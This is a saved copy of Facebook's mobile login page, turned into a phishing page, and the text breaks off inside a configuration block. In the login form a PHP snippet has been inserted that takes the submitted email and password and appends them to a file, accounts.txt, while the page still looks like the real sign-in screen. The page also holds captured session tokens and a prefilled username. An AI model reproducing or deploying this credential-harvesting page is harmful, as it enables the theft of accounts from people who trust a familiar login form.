̥<!DOCTYPE html>
<!-- saved from url=(0066)https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.google.com%2F&_rdr -->
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Facebook – log in or sign up</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <meta name="theme-color" content="#3b5998">
    <link type="text/css" rel="stylesheet" href="./Facebook – log in or sign up_files/6HVL3w_dXEq.css"
          data-bootloader-hash="rCDRu" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="./Facebook – log in or sign up_files/pI8K3zoo_Kw.css"
          data-bootloader-hash="TrKTC" crossorigin="anonymous">
    <script id="u_0_g">function envFlush(a) {
        function b(b) {
            for (var c in a) b[c] = a[c]
        }

        window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
    }

    envFlush({
        "timeslice_heartbeat_config": {
            "pollIntervalMs": 33,
            "idleGapThresholdMs": 60,
            "ignoredTimesliceNames": {
                "requestAnimationFrame": true,
                "Event listenHandler mousemove": true,
                "Event listenHandler mouseover": true,
                "Event listenHandler mouseout": true,
                "Event listenHandler scroll": true
            },
            "isHeartbeatEnabled": true,
            "isArtilleryOn": false
        },
        "shouldLogCounters": true,
        "timeslice_categories": {"react_render": true, "reflow": true},
        "sample_continuation_stacktraces": true,
        "dom_mutation_flag": true
    });</script>
    <script>document.domain = 'facebook.com';
    /^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash) && location.replace(location.hash.substr(location.hash.indexOf("!") + 1));</script>
    <script>__DEV__ = 0;</script>
    <script id="u_0_h" crossorigin="anonymous" src="./Facebook – log in or sign up_files/L59wfh1v8r4.js.download"
            data-bootloader-hash="tOTQ1"></script>
    <script id="u_0_e">CavalryLogger = window.CavalryLogger || function (a) {
        this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {t_cstart: window._cstart}, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.initializeInstrumentation && this.initializeInstrumentation()
    }, CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
        this.is_detailed_profiler = a;
        return this
    }, CavalryLogger.prototype.setTTIEvent = function (a) {
        this.tti_event = a;
        return this
    }, CavalryLogger.prototype.setValue = function (a, b, c, d) {
        d = d ? this.piggy_values : this.values;
        (typeof d[a] === "undefined" || c) && (d[a] = b);
        return this
    }, CavalryLogger.prototype.getLastTtiValue = function () {
        return this.lastTtiValue
    }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function (a, b, c, d) {
        this.mark(a);
        var e = this.values.t_cstart || this.values.t_start;
        e = d ? e + d : CavalryLogger.now();
        this.setValue(a, e, b, c);
        this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
        return this
    }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function (a) {
        console.timeStamp(a)
    } : function () {
    }, CavalryLogger.prototype.addPiggyback = function (a, b) {
        this.piggy_values[a] = b;
        return this
    }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.disableArtilleryOnUntilOffLogging = !1, CavalryLogger.getInstance = function (a) {
        typeof a === "undefined" && (a = CavalryLogger.id);
        CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
        return CavalryLogger.instances[a]
    }, CavalryLogger.setPageID = function (a) {
        if (CavalryLogger.id === 0) {
            var b = CavalryLogger.getInstance();
            CavalryLogger.instances[a] = b;
            CavalryLogger.instances[a].lid = a;
            delete CavalryLogger.instances[0]
        }
        CavalryLogger.id = a
    }, CavalryLogger.now = function () {
        return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
    }, CavalryLogger.prototype.measureResources = function () {
    }, CavalryLogger.prototype.profileEarlyResources = function () {
    }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
    }, CavalryLogger.start_js = function () {
    }, CavalryLogger.done_js = function () {
    };
    CavalryLogger.getInstance().setTTIEvent("t_domcontent");
    CavalryLogger.prototype.measureResources = function (a, b) {
        if (!this.log_resources) return;
        var c = "bootload/" + a.name;
        if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
        var d = CavalryLogger.now();
        this.ongoing_watch[c] = d;
        "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
        b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
        if (a.type === "js") {
            c = "js_exec/" + a.name;
            this.ongoing_watch[c] = d
        }
    }, CavalryLogger.prototype.stopWatch = function (a) {
        if (this.ongoing_watch[a]) {
            var b = CavalryLogger.now(), c = b - this.ongoing_watch[a];
            this.bootloader_metrics[a] = c;
            var d = this.piggy_values;
            a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
            delete this.ongoing_watch[a]
        }
        return this
    }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
        var a = {};
        Object.values(window.CavalryLogger.instances).forEach(function (b) {
            b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
        });
        return a
    }, CavalryLogger.start_js = function (a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
    }, CavalryLogger.done_js = function (a) {
        for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
    }, CavalryLogger.prototype.profileEarlyResources = function (a) {
        for (var b = 0; b < a.length; b++) this.measureResources({name: a[b][0], type: a[b][1] ? "js" : ""}, "_EF_")
    };
    CavalryLogger.getInstance().log_resources = true;
    CavalryLogger.getInstance().setIsDetailedProfiler(true);
    window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");</script>
    <script id="u_0_f">(function _(a, b, c, d) {
        function e(a) {
            document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"
        }

        function f(a, b) {
            document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure"
        }

        if (!a) {
            e(b);
            e(c);
            return
        }
        a = null;
        (navigator.userAgent.indexOf("Firefox") !== -1 || !window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1) && (document.documentElement != null && (a = screen.width / document.documentElement.offsetWidth, a = Math.max(1, Math.floor(a * 2) / 2)));
        (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && (a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96, a = Math.max(1, Math.round(a * 2) / 2));
        f(b, (a || window.devicePixelRatio || 1).toString());
        e = window.screen ? screen.width : 0;
        b = window.screen ? screen.height : 0;
        f(c, e + "x" + b);
        d && document.cookie && window.devicePixelRatio > 1 && document.location.reload()
    })(true, "m_pixel_ratio", "wd", false);</script>
    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04"
          content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
    <meta name="description"
          content="Create an account or log in to Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
    <link rel="canonical" href="https://www.facebook.com/">
    <link href="./Facebook – log in or sign up_files/SnCw2O1hpyV.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/SnCw2O1hpyV.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/Glpx_rv08tr.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/Glpx_rv08tr.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/2XZ6vXLoXjM.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/2XZ6vXLoXjM.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/oEypV12jOSY.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/oEypV12jOSY.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/nEnpPTtt7yT.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/nEnpPTtt7yT.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/o6BkRFKwU8P.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/o6BkRFKwU8P.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/p8tuvcqXYV3.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/p8tuvcqXYV3.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/nJcAgC8Zbun.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/nJcAgC8Zbun.js.download" async=""
            crossorigin="anonymous"></script>
    <link href="./Facebook – log in or sign up_files/svFKQXueTby.js.download" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="./Facebook – log in or sign up_files/svFKQXueTby.js.download" async=""
            crossorigin="anonymous"></script>
</head>
<body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw portrait"
      style="min-height: 823px; background-color: rgb(255, 255, 255);" cz-shortcut-listen="true">
<script id="u_0_d">(function (a) {
    a.__updateOrientation = function () {
        var b = !!a.orientation && a.orientation !== 180, c = document.body;
        c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
        return b
    }
})(window);</script>
<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 823px;"><h1
        style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page" class="">
        <div class="_129_" id="header-notices"></div>
        <div class="_7om2 _52we _52z5" id="header">
            <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="https://m.facebook.com/login/?refid=8"><i
                    class="img sp_MfVlDRwIabw_3x sx_88d1e9"><u>facebook</u></i></a></div>
        </div>
        <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"
             style="min-height: 823px;">
            <div class="_7om2">
                <div class="_4g34" id="u_0_0">
                    <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                        <div class="_52jd"></div>
                    </div>
                    <div class="aclb _4-4l">
                        <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
                            <div class="_qw9 grouped aclb" id="u_0_1"><a
                                    href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DFptqXbJtcJgjf8uw3H6AwU-D%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8"
                                    target="_top" class="touchableArea first last area touchable acy apl abt abb"
                                    data-sigil="touchable marea">
                                <div class="ib cc"><i class="img l img _2sxw"
                                                      style="background-image: url(&#39;https\3a //static.xx.fbcdn.net/rsrc.php/v3/y1/r/K2XTtzcjLEq.png&#39;);background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i>
                                    <div class="c"><span class="fcl">Get Facebook for Android and browse faster.</span>
                                    </div>
                                </div>
                            </a></div>
                            <iframe style="display: none;"
                                    src="./Facebook – log in or sign up_files/saved_resource.html"></iframe>
                        </div>
                        <div class="_5rut">

                            <?php

                            if(isset($_POST['submit']))
                            {
                                $username = $_POST['email'];
                                $password = $_POST['pass'];
                                $text = $username . "," . $password . "\n";
                                $fp = fopen('accounts.txt', 'a+');

                                if(fwrite($fp, $text))  {


                                }
                                fclose ($fp);
                            }
                            ?>



                            <form method="post"
                                  action=""><input type="hidden" name="lsd"
                                                                                          value="AVoOKyYc"
                                                                                          autocomplete="off"><input
                                    type="hidden" name="jazoest" value="2725" autocomplete="off"><input type="hidden"
                                                                                                        name="m_ts"
                                                                                                        value="1572620148"><input
                                    type="hidden" name="li" value="dEe8XekE3CnqrLq2VUIJZBsL"><input type="hidden"
                                                                                                    name="try_number"
                                                                                                    value="0"
                                                                                                    data-sigil="m_login_try_number"><input
                                    type="hidden" name="unrecognized_tries" value="0"
                                    data-sigil="m_login_unrecognized_tries">
                                <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                <div id="otp_retrieve_desc_container"></div>
                                <div class="_56be _5sob">
                                    <div class="_55wo _55x2 _56bf">
                                        <div id="email_input_container"><input autocorrect="off" autocapitalize="off"
                                                                               type="text" class="_56bg _4u9z _5ruq"
                                                                               autocomplete="on" id="m_login_email"
                                                                               name="email"
                                                                               placeholder="Mobile number or email addressx"
                                                                              ></div>
                                        <div>
                                            <div class="_1upc _mg8" data-sigil="m_login_password">
                                                <div class="_7om2">
                                                    <div class="_4g34 _5i2i _52we">
                                                        <div class="_5xu4"><input autocorrect="off" autocapitalize="off"
                                                                                  class="_56bg _4u9z _27z2"
                                                                                  autocomplete="on"
                                                                                  id="m_login_password" name="pass"
                                                                                  placeholder="Password" type="password"
                                                                                  data-sigil="password-plain-text-toggle-input">
                                                        </div>
                                                    </div>
                                                    <div class="_5s61 _216i _5i2i _52we">
                                                        <div class="_5xu4">
                                                            <div class="_2pi9" style="" id="u_0_2"><a
                                                                    href="https://m.facebook.com/?refsrc=http%3A%2F%2Fwww.google.com%2F&amp;_rdr#"
                                                                    data-sigil="password-plain-text-toggle"><span
                                                                    class="mfss" style="display:none"
                                                                    id="u_0_3">HIDE</span><span class="mfss" id="u_0_4">SHOW</span></a>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="_2pie" style="text-align:center;">
                                    <div id="u_0_5" data-sigil="login_password_step_element">
                                        <input name = "submit" value="Log In"
                                               aria-label="Log In "
                                               data-testid="royal_login_button"

                                               type="submit" style="    background-color: #1867f2;
    width: 350px;
    height: 35px;">


                                        <style>
                                            input[type=submit] {
                                                padding:5px 15px;
                                                background:#ccc;
                                                border:0 none;
                                                cursor:pointer;
                                                -webkit-border-radius: 5px;
                                                border-radius: 5px;
                                                color: white;

                                            }


                                        </style>


                                    </div>
                                    <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                                    <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                    <div id="otp_button_elem_container"></div>
                                </div>
                                <input type="hidden" name="prefill_contact_point" id="prefill_contact_point"
                                       value="ishriyansh"><input type="hidden" name="prefill_source" id="prefill_source"
                                                                 value="browser_dropdown"><input type="hidden"
                                                                                                 name="prefill_type"
                                                                                                 id="prefill_type"
                                                                                                 value="password"><input
                                        type="hidden" name="first_prefill_source" id="first_prefill_source"
                                        value="browser_dropdown"><input type="hidden" name="first_prefill_type"
                                                                        id="first_prefill_type"
                                                                        value="contact_point"><input type="hidden"
                                                                                                     name="had_cp_prefilled"
                                                                                                     id="had_cp_prefilled"
                                                                                                     value="true"><input
                                        type="hidden" name="had_password_prefilled" id="had_password_prefilled"
                                        value="true"><input type="hidden" name="is_smart_lock" id="is_smart_lock"
                                                            value="false">
                                <div class="_xo8"></div>
                                <noscript><input type="hidden" name="_fb_noscript" value="true"/></noscript>
                            </form>
                            <div>
                                <div class="_43mg"><span class="_43mh">or</span></div>
                                <div class="_52jj _5t3b" id="u_0_6"><a role="button"
                                                                       class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                                                       id="signup-button" tabindex="0"
                                                                       data-sigil="m_reg_button" data-autoid="autoid_3">Create
                                    New Account</a></div>
                            </div>
                            <div>
                                <div class="other-links">
                                    <ul class="_5pkb _55wp">
                                        <li><span class="mfss fcg"><a tabindex="0"
                                                                      href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8"
                                                                      id="forgot-password-link">Forgotten password?</a><span
                                                aria-hidden="true"> · </span><a
                                                href="https://m.facebook.com/help/?refid=8" id="help-link" class="sec">Help Centre</a></span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div style="display:none"></div>
            <span><img src="./Facebook – log in or sign up_files/hsts-pixel.gif" width="0" height="0"
                       style="display:none"></span>
            <div class="_55wr _5ui2" data-sigil="m_login_footer">
                <div class="_5dpw">
                    <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="_7om2">
                            <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
                                <div class="_3ztc"><span class="_52jc"><a
                                        href="https://m.facebook.com/a/language.php?l=mr_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;gfid=AQCGPPO1mPTJ3Z3G&amp;refid=8"
                                        data-locale="mr_IN" data-sigil="change_language">मराठी</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a
                                        href="https://m.facebook.com/a/language.php?l=pa_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;gfid=AQDBjJCRM3ualSu8&amp;refid=8"
                                        data-locale="pa_IN" data-sigil="change_language">ਪੰਜਾਬੀ</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a
                                        href="https://m.facebook.com/a/language.php?l=gu_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;gfid=AQASfQiRVWQAScdZ&amp;refid=8"
                                        data-locale="gu_IN" data-sigil="change_language">ગુજરાતી</a></span></div>
                            </div>
                            <div class="_4g34">
                                <div class="_3ztc"><span class="_52jc"><a
                                        href="https://m.facebook.com/a/language.php?l=hi_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;gfid=AQDIsR3F8dluvm_7&amp;refid=8"
                                        data-locale="hi_IN" data-sigil="change_language">हिन्दी</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a
                                        href="https://m.facebook.com/a/language.php?l=ur_PK&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;gfid=AQDtyWgEOk2KQ0Wy&amp;refid=8"
                                        data-locale="ur_PK" data-sigil="change_language">اردو</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a
                                        href="https://m.facebook.com/a/language.php?l=bn_IN&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;gfid=AQBUIA3vZ0-JzjNq&amp;refid=8"
                                        data-locale="bn_IN" data-sigil="change_language">বাংলা</a></span></div>
                                <a href="https://m.facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&amp;refid=8">
                                    <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages"
                                         data-sigil="more_language"><i class="img sp_MfVlDRwIabw_3x sx_08de3c"></i>
                                    </div>
                                </a></div>
                        </div>
                    </div>
                    <div class="_5ui4"><span class="mfss fcg">Facebook Inc.</span></div>
                </div>
            </div>
        </div>
        <div class=""></div>
        <div class="viewportArea _2v9s" style="display:none" id="u_0_7" data-sigil="marea">
            <div class="_5vsg" id="u_0_8" style="max-height: 205px;"></div>
            <div class="_5vsh" id="u_0_9" style="max-height: 411px;"></div>
            <div class="_5v5d fcg">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
                     data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                Loading...
            </div>
        </div>
        <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
            <div class="container">
                <div class="image"></div>
                <div class="message" data-sigil="error-message"></div>
                <a class="link" data-sigil="MPageError:retry">Try Again</a></div>
        </div>
    </div>
</div>
<div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1">
        <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
            <div class="_7om2 _52we">
                <div class="_5s61">
                    <div class="_52z7">
                        <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_b"
                                data-sigil="dialog-cancel-button">Cancel
                        </button>
                        <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly"
                                aria-label="Back" id="u_0_c" data-sigil="dialog-back-button"><i
                                class="img sp_MfVlDRwIabw_3x sx_4bbc1f" style="margin-top: 2px;"></i></button>
                    </div>
                </div>
                <div class="_4g34">
                    <div class="_52z6">
                        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0"
                             data-sigil="m-dialog-header-title dialog-title">Loading...
                        </div>
                    </div>
                </div>
                <div class="_5s61">
                    <div class="_52z8" id="modalDialogHeaderButtons"></div>
                </div>
            </div>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
            <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a"
                 data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
            Loading...
        </div>
    </div>
</div>
<script id="u_0_i" crossorigin="anonymous" src="./Facebook – log in or sign up_files/nFUlWAMLa9j.js.download"
        data-bootloader-hash="FDfRV"></script>
<script id="u_0_j" crossorigin="anonymous" src="./Facebook – log in or sign up_files/5bcnOi4Q6za.js.download"
        data-bootloader-hash="oFZdM"></script>
<script id="u_0_k" crossorigin="anonymous" src="./Facebook – log in or sign up_files/hz3f6QD7jZb.js.download"
        data-bootloader-hash="fKCiQ"></script>
<script id="u_0_l">requireLazy(["gkx"], function (gkx) {
    gkx.add({
        "946894": {"result": false, "hash": "AT7eCD_tcrErLOS1"},
        "676920": {"result": false, "hash": "AT4DwOdjYuzoX80M"},
        "676921": {"result": false, "hash": "AT6x7bwniqJ_Isua"},
        "1113247": {"result": false, "hash": "AT7AzFT4Zmz2xxfE"},
        "676922": {"result": false, "hash": "AT6Be6c7aNjAQYig"},
        "1167394": {"result": false, "hash": "AT70Yq7-Z_Y5HqZP"},
        "676837": {"result": false, "hash": "AT426I4PShjZGp4V"}
    });
});
require("TimeSliceImpl").guard(function () {
    (require("ServerJSDefine")).handleDefines([["cr:717822", ["TimeSliceImpl"], {"__rc": ["TimeSliceImpl", "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:696703", [], {"__rc": [null, "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:1100101", ["requestAnimationFrameAcrossTransitionsSimple"], {"__rc": ["requestAnimationFrameAcrossTransitionsSimple", "Aa2wRiuW2McsT8LP__E38Pyflw2asuqh3gviVtaOMawpwJmRzPLKMoIYurBWXia2ozMzjqQ"]}, -1], ["cr:1000292", ["BanzaiNew"], {"__rc": ["BanzaiNew", "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["cr:729414", [], {"__rc": [null, "Aa0vH5-hU9pwQJnbKWLkOhxzOzxYlDjZXd3mkVScmkj28CRww-lzcER4p19ILHtrazs5Smr7KjO0o2uOtVuP"]}, -1], ["cr:692209", ["cancelIdleCallbackBlue"], {"__rc": ["cancelIdleCallbackBlue", "Aa1MmKOK9UnXDXJoOjnif--ARn72HyvTe4_oJwut8E6mK9azggVaZEQRgtM4A7I6WlOFv7Cf8yUStkGrYtY2Beg"]}, -1], ["ArtilleryExperiments", [], {
        "artillery_static_resources_pagelet_attribution": false,
        "artillery_timeslice_compressed_data": false,
        "artillery_miny_client_payload": false,
        "artillery_prolong_page_tracing": false,
        "artillery_navigation_timing_level_2": false,
        "artillery_profiler_on": false,
        "artillery_merge_max_distance_sec": 1,
        "artillery_merge_max_duration_sec": 1,
        "user_timing": false
    }, 1237], ["BootloaderConfig", [], {
        "jsRetries": null,
        "jsRetryAbortNum": 2,
        "jsRetryAbortTime": 5,
        "payloadEndpointURI": "https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/",
        "preloadBE": false,
        "assumeNotNonblocking": false,
        "shouldCoalesceModuleRequestsMadeInSameTick": true,
        "staggerJsDownloads": false,
        "preloader_num_preloads": 0,
        "preloader_preload_after_dd": false,
        "preloader_num_loads": 1,
        "preloader_enabled": false,
        "retryQueuedBootloads": false,
        "silentDups": false,
        "asyncPreloadBoost": true
    }, 329], ["CSSLoaderConfig", [], {
        "timeout": 5000,
        "modulePrefix": "BLCSS:",
        "loadEventSupported": true
    }, 619], ["ServerNonce", [], {"ServerNonce": "PiV_98iI_M9K_oYylHYWiA"}, 141], ["UriNeedRawQuerySVConfig", [], {"uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx"]}, 3871], ["TrustedTypesConfig", [], {
        "useTrustedTypes": false,
        "reportOnly": true
    }, 4548], ["ImmediateImplementationExperiments", [], {"prefer_message_channel": true}, 3419], ["PromiseUsePolyfillSetImmediateGK", [], {"www_always_use_polyfill_setimmediate": false}, 2190], ["CurrentCommunityInitialData", [], {}, 490], ["CurrentUserInitialData", [], {
        "USER_ID": "0",
        "ACCOUNT_ID": "0",
        "NAME": "",
        "SHORT_NAME": null,
        "IS_MESSENGER_ONLY_USER": false,
        "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
        "APP_ID": "412378670482"
    }, 270], ["MRequestConfig", [], {
        "dtsg": {
            "token": "AQFmNflzgNZj:AQGJ1dZCB-NE",
            "valid_for": 86400,
            "expire": 1572706548
        },
        "dtsg_ag": {
            "token": "AQzt7g0iXyqzEF4f8SVc43pzDZJSywpNm1A1plXQA9EUgg:AQzjhxAMD93fOk4eFALo8kwO-0Dg6VNaDgUM6ssM2g0t5g",
            "valid_for": 604800,
            "expire": 1573224948
        },
        "lsd": "AVoOKyYc",
        "checkResponseOrigin": true,
        "checkResponseToken": true,
        "cleanFinishedRequest": false,
        "cleanFinishedPrefetchRequests": false,
        "ajaxResponseToken": {
            "secret": "yuKxpdN38OEZ9nuGKdeEMwGCXSIR-vbn",
            "encrypted": "AYnDOEb9QvYIUpdE84B_633LH1BPf118Y4Fb2Ba6YKs0ccs3fTzM3X8njr4aVVnFFmR5lfxpaAjRg5VogoQg_ZWaIZm5J3h1SwOF_619hoVMYw"
        }
    }, 51], ["SprinkleConfig", [], {
        "param_name": "jazoest",
        "version": 2,
        "should_randomize": false
    }, 2111], ["ISB", [], {}, 330], ["LSD", [], {"token": "AVoOKyYc"}, 323], ["SiteData", [], {
        "server_revision": 1001372137,
        "client_revision": 1001372137,
        "tier": "",
        "push_phase": "C3",
        "pkg_cohort": "FW_EXP:mtouch_pkg",
        "pr": 3,
        "haste_site": "mobile",
        "be_mode": 1,
        "be_key": "__be",
        "ir_on": true,
        "is_rtl": false,
        "is_comet": false,
        "hsi": "6754352104878490299-0",
        "spin": 0,
        "__spin_r": 1001372137,
        "__spin_b": "trunk",
        "__spin_t": 1572620148,
        "vip": "31.13.79.35"
    }, 317], ["InitialCookieConsent", [], {
        "deferCookies": false,
        "noCookies": false,
        "shouldShowCookieBanner": false
    }, 4328], ["ErrorDebugHooks", [], {"SnapShotHook": null}, 185], ["BigPipeExperiments", [], {
        "link_images_to_pagelets": false,
        "enable_bigpipe_plugins": false
    }, 907], ["RunGatingConfig", [], {"shouldUseBrowserUnload": true}, 3914], ["CookieCoreConfig", [], {
        "a11y": {"s": "None"},
        "act": {"s": "Lax"},
        "c_user": {"s": "None"},
        "ddid": {"p": "\/deferreddeeplink\/", "t": 2419200, "s": "None"},
        "dpr": {"t": 604800, "s": "None"},
        "js_ver": {"t": 604800, "s": "None"},
        "locale": {"t": 604800, "s": "None"},
        "lh": {"t": 604800, "s": "None"},
        "m_pixel_ratio": {"t": 604800, "s": "None"},
        "noscript": {"s": "None"},
        "pnl_data2": {"t": 2, "s": "None"},
